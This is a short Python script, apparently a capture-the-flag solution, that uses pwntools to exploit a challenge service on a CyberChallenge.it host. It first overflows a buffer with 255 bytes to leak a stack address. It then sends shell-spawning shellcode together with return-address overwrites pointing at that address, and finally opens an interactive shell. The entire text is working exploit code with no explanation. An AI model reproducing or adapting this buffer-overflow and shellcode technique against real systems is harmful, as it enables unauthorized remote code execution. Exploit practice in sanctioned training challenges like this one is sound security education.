from pwn import *

#context(arch='i386')

HOST = "securitycheck.challs.cyberchallenge.it"
PORT = 9261
io = remote(HOST, PORT)

io.clean(0.05)

payload_leak = 'A' * 255 + '\x00'
io.sendline(payload_leak)

io.recvuntil('dst is at')
leak_addr = int(io.recvuntil(', now checking security', drop=True), 16)
print(hex(leak_addr))

payload_2 = fit(
    {0: asm(shellcraft.sh()), 230: p32(leak_addr) * 4, 254: '\x00'})
assert b'\n' not in payload_2
assert payload_2.index(b'\x00') == 254

io.sendline(payload_2)
io.recvuntil('')

io.interactive()
